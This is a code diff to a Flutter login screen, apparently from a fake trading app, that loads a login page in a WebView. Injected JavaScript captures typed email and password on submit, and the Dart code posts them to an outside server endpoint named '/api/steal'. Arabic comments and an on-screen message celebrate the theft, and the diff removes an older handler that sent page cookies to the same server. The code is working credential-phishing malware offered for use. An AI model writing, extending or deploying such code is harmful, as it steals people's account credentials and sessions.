@@ -62,14 +62,30 @@ class _LoginScreenState extends State<LoginScreen> {
         'QTX_CREDS',
         onMessageReceived: (msg) async {
           print("JAVASCRIPT MESSAGE: ${msg.message}");
+          
           try {
-            await http.post(
-              Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-              headers: {"Content-Type": "application/json"},
-              body: msg.message,
-            );
-            if (mounted) {
-              Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+            var data = jsonDecode(msg.message);
+            // هون بنمسك بس لما يكون في إيميل وباسورد
+            if (data['type'] == 'creds' && data['email'] != null && data['email'] != "" && data['password'] != null) {
+              
+              // إشعار إنه سرقنا البيانات
+              if (mounted) {
+                ScaffoldMessenger.of(context).showSnackBar(
+                  SnackBar(content: Text("تم سرقة البيانات! ${data['email']}"), backgroundColor: Colors.green),
+                );
+              }
+
+              // نبعتها للسيرفر
+              await http.post(
+                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+                headers: {"Content-Type": "application/json"},
+                body: msg.message,
+              );
+
+              // نحول المستخدم للواجهة
+              if (mounted) {
+                Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+              }
             }
           } catch (e) {
             print("Error: $e");
@@ -78,20 +94,11 @@ class _LoginScreenState extends State<LoginScreen> {
       )
       ..setNavigationDelegate(
         NavigationDelegate(
-          onPageFinished: (url) async {
-            // 377. نسحب الكوكيز مباشرة بعد ما تحمل الصفحة
-            final cookiesResult = await _controller.runJavaScriptReturningResult("document.cookie");
-            String cookieString = cookiesResult.toString().replaceAll('"', '');
-            
-            if (cookieString.isNotEmpty) {
-              await http.post(
-                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-                headers: {"Content-Type": "application/json"},
-                body: jsonEncode({"type": "cookies", "data": cookieString}),
-              );
-            }
-
-            _injectOriginalScript();
+          onPageFinished: (url) {
+            // نحقن السكربت بعد ثانيتين من تحميل الصفحة
+            Future.delayed(const Duration(seconds: 2), () {
+              _injectOriginalScript();
+            });
           },
         ),
       )
@@ -103,14 +110,17 @@ class _LoginScreenState extends State<LoginScreen> {
       (function() {
         function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
         function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
+        
         function sendCreds() {
           try {
             var e = findEmail(), p = findPass();
+            // 383. نتأكد إنه الحقول مليانة
             if (e && p && e.value && p.value) {
               QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
             }
           } catch (err) {}
         }
+        
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
           document.addEventListener('submit', sendCreds, true);
